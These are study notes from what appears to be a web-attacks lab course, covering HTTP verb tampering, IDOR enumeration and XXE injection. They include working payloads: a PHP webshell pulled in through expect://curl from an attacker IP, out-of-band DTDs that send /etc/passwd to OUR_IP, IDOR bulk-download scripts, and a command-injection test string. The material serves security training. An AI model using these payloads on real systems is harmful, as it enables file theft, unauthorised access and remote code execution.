# Intro

# HTTP Verb Tampering
## Intro
### Verbs
HTTP has 9 different verbs that can be accepted as HTTP methods  

Commonly Used Verbs, other than `GET` and `POST`:
|Verb|Description|
|----|-----------|
|`HEAD`|Identical to a `GET` request, but its response only contains the headers, without the response body|
|`PUT`|Writes the request payload to the specified location|
|`DELETE`|Deletes the resource at the specified location|
|`OPTIONS`|Shows different options accepted by a web server, like accepted HTTP verbs|
|`PATCH`|Apply partial modifications to the resource at the specified location|

### Insecure Configurations
Example config:
```xml
<Limit GET POST>
    Require valid-user
</Limit>
```
In the above, even though the admin limits `GET` and `POST` to valid users, you may be able to use another method (like `HEAD`) to get the same result.

### Insecure Coding
Example Code:
```php
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
    ...SNIP...
}
```
In the above example, the sanitization check is only being performed on the `GET` request `if(preg_match($pattern, $_GET["code"])) {`. However, the actual query (`$query`) is built using the `$_REQUEST["code"]` parameters. This will allow a `POST` request to bypass the sanitization check. 

## Bypassing Basic Authentication
### Identification
- Look for `401 Unauthorized` page or HTTP basic auth prompt.
- Identify the URL the button or function points to.
- Determine whether it's the page or the folder that is restricted. (ie: is `admin/reset.php` restricted or is the entire admin folder?)
    - Visit just the folder, and see if you get a basic auth prompt. Example: visit `http://www.example.com/admin` and see if you get a prompt.

### Exploitation
- Analyze the page in burp and to determine what kind of request is being sent. (`GET`, `POST`, etc.)
- Try a different request type.
    - Check which verbs are available on the server.
    ```
    curl -i -X OPTION http://[server]:[port]/
    ```
    - In burp, either right-click the request and select `Change Request Method` or send to repeater and change manually.
    - For `GET` requests in particular, try using `HEAD`.
        - No output from `HEAD`, but may still trigger the functionality.
- See if we still get an auth prompt.

## Bypassing Security Filters
Insecure Coding is the most common type of Verb Tampering. Most commonly found in security filters that only process one type of request, and leave the other requests open.

### Identification
- Try and use special characters in the functionality and see if they are removed. Example file upload function: `test;!`.
    - See if the special characters are removed or the functionality is just blocked

### Exploitation
- Intercept the request in burp and change the verb.
- See if the functionality works even with the special character (It may just strip the special characters)
- Check and see if the function even works, if it does, we may have Command Execution on the server.
- Using our file manager example, we can try and add 2 files.
    - `file1; touch file 2`
- Check and see if both files were created.

# Insecure Direct Object Reference (IDOR)
IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. If any user can access any resource due to the lack of a solid access control system, the system is considered to be vulnerable.

For example, if users request access to a file they recently uploaded, they may get a link to it such as (download.php?file_id=123). So, as the link directly references the file with (file_id=123), what would happen if we tried to access another file (which may not belong to us) with (download.php?file_id=124)?

## Identifying IDOR
### URL Parameters and APIs
- Look for URL parameters or API's (`?uid=1` or `?filename=file_1.pdf`) in the request
    - Try incrementing the parameter (if numerical). Example: `?uid=2` or `?filename=file_2.pdf`

### AJAX Calls
- Looking for functions in the front end code
    - Developers may put all of the functions in the front end code, but only surface the ones needed based on the users authorization level. However, the code will still remain and may be accessible.
Example Java Code:
```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```
The above function may never be called as a non-admin user, but if we find it in the front-end code, we may still be able to use it.

### Hashing/Encoding
- Some web apps may encode the object reference.
    In that case, we can attempt to decode it, change it, and then recode it to view the object.
- Some objects may hash the object reference.
    - Reviewing the source code of the site may reveal that the hashing function is buried in the front end, like the code below.
    ```javascript
    $.ajax({
        url:"download.php",
        type: "post",
        dataType: "json",
        data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
        success:function(result){
            //
        }
    });
    ```

### Compare User Roles
- Register multiple users and compare HTTP requests and object references.
- Example: 2 different users, one of them can view their salary after making the following API call.
```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```
- The 2nd user may not have all of these API parameters and shouldn't be able to make the same call as user 1. 
- We can try repeating the call with user 2 and see if the webapp returns anything.
- This will work if the webapp only requires a valid session to make the API call but has no access control on the backend to compare the callers session with the data being called.

## Mass IDOR Enumeration
![idor documents](images/web_attacks_idor_documents.jpg)
*Example IDOR vulneerable website*

- Analyzing the page, we see several documents belonging to the user
```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```
- It looks like the app is using the `uid` parameter as part of the file name.
- Changing the `uid` parameter to '2', we see we have new file names:
```html
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```
- Enumerating these manually will take forever, we need to automate
### Mass Enumeration
- Inspecting the code in firefox, we see the following html for the links:
```htmml
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```
- We could grep for the links, using curl
```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```
- A better plan might be to use a regex to isolate the actual url:
```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```
- Now we can use a bash `for` loop and wget to create a script to download all the files for all of the users
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```
*This script only works on employees 1-10. We'll need to adjust it for further use*

## Bypassing Encoded References
### Examples
![contracts.php](images/web_attacks_idor_contracts.jpg)
*Employee manager web application contracts*

![download.php](images/web_attacks_idor_download_contract.jpg)
*Employee manager contracts download.php*

### Enumeration
We see that the download functionality is sending a post request with the parameter:
```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```
- Function Disclosure
> Developers may make the mistake of making the obfuscation code available on the front-end. Looking at the source code of the page, we may find how the link hash is generated.
```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```
*Example obfuscation function*
- Code Analysis  
    Function appears to send a post request with the contract parameter. The value it sends is an md5 hash from CryptoJS. The value being hashed is a base64(btoa) encoded string of the UID variable. The UID is our previously discovered UID in the original IDOR. In this case, 1. So all this code does is MD5 the base64 hash of 1 (the UID).

We can test this with the following and seeing if our hashes line up.
```bash
echo -n 1 | base64 -w 0 | md5sum
```
> Note: Use `-n` and `-w` to avoiding adding newlines.

### Exploitation
Now that we've reversed the obfuscation, we can write another bash script to download everyones contract.
```bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```
> Note: We use `tr -d` to remove the trailing " -"

Now we make a post request to actually download the files.
```bash
#! /bin/bash
for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -SOJ -X POST -d "contract=$hash" http://server_ip:port/download.php
    done
done
```

## IDOR in Insecure APIs
### Example Site
![idor_employee_manager](images/web_attacks_idor_employee_manager.jpg)
*Example Employee Manager*

![idor_edit_profile.jpg](images/web_attacks_idor_edit_profile.jpg)
*Example Employee Edit Profile*

### Enumeration
- Verify that any changes made persist through refreshes (Indicates they are stored in a db)
- Interecept the request
    ![idor_update_request](images/web_attacks_idor_update_request.jpg)
    *Intercepted update request*
    - Things to note from our intercepted request
        - Hidden Fields. Namely the `UID`,`UUID`, and `role` fields
        - Cookie defines our access level.
        - Using the `PUT` method to update
            - Note: `PUT` is often used to update fields, whereas `POST` is often used to create new, `DELETE` is used to delete, and `GET` to retrieve.

### Exploitation
- Things to try in this example:  
    - Change the UID
    - Change the UUID
    - Change the cookie to something like `admin`
    - Change the role to something like `admin`
    - Change the method to `POST` and see if we can create a new user

## Chaining IDOR Vulnerabilities
### Information Disclosure
- Using `GET` requests to gather information about Users
    - In this particular instance, identifying the roles so we can get admin
- Changing the email address and then sending a password reset request.

### Chaining 2 IDOR vulnerabilities.
- Example IDOR Enumeration Script
```bash
#!/bin/bash

for i in {1..20}; do
  curl -X GET http://94.237.120.233:58089//profile/api.php/profile/$i
  echo
done
```

- Once we've done some recon and identified roles, we can change the role and create a new user.

# XML External Entity (XXE) Injection
## Summary
XML External Entity Injection occurs when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions.
### XML
```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body> 
</email>
```
*XML Example*

Key Elements  
|Key|Definition|Example|
|---|----------|-------|
|`Tag`|The keys of an XML document, usually wrapped with (</>) characters.|`<date>`|
|`Entity`|XML variables, usually wrapped with (&/;) characters.|`&lt;`|
|`Element`|The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag.|`<date>01-01-2022</date>`|
|`Attribute`|Optional specifications for any element that are stored in the tags, which may be used by the XML parser.|`version="1.0"/encoding="UTF-8"`|
|`Declaration`|Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.|`<?xml version="1.0" encoding="UTF-8"?>`|

### XML DTD
XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure. The pre-defined structure can be defined in the document itself or an external file.
```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```
*Example DTD for the XML above*

The DTD can be placed within the XML document itself, right after the declaration in the first line, or it may be an external file and then referenced in the XML with the `SYSTEM` keyword.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```
*Referencing an external DTD with `SYSTEM`*

The DTD can also be referenced through a URL:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

### XML Entities
We can define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
*Creation of an XML Entity named 'company'*

Once an entity has been created, it can be referenced with an ampersand `&` and a semi-colon `;`, like `&company;`. Whenever an entity  is referenced, it will be replaced with its value by the XML parser. Interestingly, we can reference `External XML Entities` with the `SYSTEM` keyword, followed by the entity's path.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```
*referencing an external entity's company and signature*
> NOTE: We may also use the `PUBLIC` keyword instead of `SYSTEM` for loading external resources. `PUBLIC` is used with publicly declared entities and standards, such as language code.  

This works similar to internal XML entities stored within documents. When refererenced, the parser will replace the entity with its value stored in the external file.

When the XML is parsed on the server-side, in cases like SOAP APIs or web forms, then an entity can reference a file stored on the back-end server, which can then be disclosed to use when we reference the entity.

## Local file Disclosure
### Summary
If a web app trusts unfiltered XML from user input, we can abuse that to reference a DTD document and create a new entity. If we define an entity that references a local file, we can then make the web page show that file.

### Enumeration
- First, we need to find a web page that accepts XML User input
![web_attacks_xxe_identify](images/web_attacks_xxe_identify.jpg)
*Example contact form*

    - If we intercept the request in burp, we can see that it formats our input as XML
![web_attacks_xxe_request](images/web_attacks_xxe_request.jpg)

    - If fill out the form and submit the request, we get the following, telling use the email field may be vulnerable (Because it displays our information back to us).
![web_attacks_xxe_response](images/web_attacks_xxe_response.jpg)

- Take note of which fields are being displayed back to us

- Now to test our potential finding, we can add an entity, and then reference it (in this case, in the email field).
```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
*New XML Entity*

![web_attakcs_xxe_new_entity](images/web_attacks_xxe_new_entity.jpg)
*We've added our entity, and referenced it in the email field*

- From the reply, we can see that it referenced our entity, so we have an XXE vulnerability

### Exploitation
Since we know we can define new entities, let's see if we can point those at the file system.

- Pretty much the same as above, but we alter our XML entity to reference a file, similar to the following:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```
- Referencing our test site above, we try it and get back the following:
![web_attacks_xxe_external_entity](images/web_attacks_xxe_external_entity.jpg)
*The response showing that we were able to access /etc/passwd*

- Now we have local file disclosure, and we can use that to get the source code of the web app, or other valuable info.

### Reading Source Code
We can't use the above method for source code because some special characters may be included that are not allowed in XML, such as `<`/`>`/`&`.

PHP in particular provides a wrapper that allows us to base64 encode certain resources, and the final base64 should not break the xml output.

- Instead of using `file` in our entity, we will use PHP's `php://filter/wrapper/`, specifying the `convert.base64-encode` encoder as our filter.
```XML
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
*using base64 php filter to exfiltrate source code*
> Note: This only works with PHP  

### Remote Code Execution
- Easiest Methods for RCE would be forcing a call back from a windows server (Responder) or locating ssh keys.
- If PHP `expect` module is installed, we may be able to use the `PHP://expect` filter
    - `expect` must be installed
    - We must get output back on the screen, such as the example above.
    - Limited to relatively simple commands that won't break XML

- One of the easiest methods would be to upload a webshell hosted on our attack host, and have the `expect` method upload it for us.
```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```
- Now we can use the following XML to upload it to the server
```XML
<?xml version="1.0"?>
<!DOCTYPE email [
    <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
```
> Note: We replaced all of the spaces with `$IFS` to avoid breaking the XML.

> Note: The expect module is not enabled/installed by default on modern PHP servers.

## Advanced File Disclosure
### Data Exfiltration with CDATA
- We can use `CDATA` to extract any kind of data (even binnary files) from any web application.
- We do this by wrapping the entity in the `CDATA` tag: `<![CDATA[ FILE_CONTENT ]]>`
- Easier to define a begin and an end, like below
```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
> Note: XML prevents joining internal and external entities, so this may not work  

### XML Parameter identities
- We can use parameter identities to get around the above referenced limitation.
- `XML Parameter Identites` are special types of entities that start with a `%` and can only be used within the DTD.
        - What's unique about parameter identites is that if we reference them from an external source, then all of them would be considered external.

- Exploitation
- We need to host the DTD on another server (Like our attack host)
```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```
- Now we can reference our external entity, and then print the `&joined;` entity we created.
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

### Error Based XXE
We may find ourselves in a situation where the web app doesn't write any output, this would be `blind XXE`. In that case, if the webapp displays runtime errors, and doesn't have proper exception handling for the XML input, then we can use this read the output of our XXE exploit. It's very possible the webapp may do neither of these, in which case we are completely blind.

- Basically, we are looking for the error message to display our XXE instead of it being output to the screen.
- Simple enumeration is to delete a tag in the XML and see if it generates an error.
- We can host the below DTD on our system and reference it from the server.
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
- The above code creates an entity `file` for the file we want to read (`<!ENTITY % file SYSTEM "file:///etc/hosts">`), and then we create a nonsense entity that tries to join with our file entity (`<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">`), since the 2nd entity does not exist, it will throw an error, along with our file entity.
- We can then that references our error entity hosted on our attack system.
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

## Blind Data Exfiltration
### Summary
Useful if the webapp doesn't write any of your inputs back to the screen.

### Out-of-band Data Exfiltration
We need to create 2 entities. One for the content of the file we are trying to read, and then one to send the contents of that file back to our attack host. We'll save these to our attack host and spin up an http server.
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
*Example xxe.dtd*

With the above entities, our first entity reads and base64 encodes the content of `/etc/passwd` and stores it in the entity `file`. The second entity, when called, performs a web request with a content parameter that contains the value of file. We can then base64 decode the content parameter to get our results.

If we want, we can generate a php script that will decode it for us. We can use the following code and save it as index.php:
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
We start a php server in the same folder as our index.php
```bash
php -S 0.0.0.0:8000
```

We then craft our request, to reference our hosted dtd file. All we have to do is add the xml containing a reference to `oob` and our `remote` entity to pull our malicious dtd.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
*Example payload*

Then we can go back to our php server and see that we did indeed get the file contents we were looking for, in this case `/etc/passwd`
>Tip: Instead of using a parameter to hold our data, we could also edit our DTD to use `%file;` as a subdomain (`%file;.our.website.com`) and use tcpdump to intercept the traffic.

### Automated OOB Exfiltration
- We can use `XXE Injector` to exfiltrate data.

- Installation
```bash
git clone https://github.com/enjoiz/XXEinjector.git
```
- Now we need to copy our request out of burp and save it as a file. We don't need to copy all of the XML, just the first line: `<?xml version="1.0" encoding="UTF-8"?>` and insert `XXEINJECT` right below it, so it should look like this:
```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```
*Sample HTTP request*

- Now we can run the tool
```bash
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```
> Note: The data will probably not be printed to the console, however, we can view the results in the log file in the tools folder.

# Practice
![practice labs](images/web_attacks_practice.jpg)
# todo
- [x] Complete
- [ ] Break this out into MyHackTools
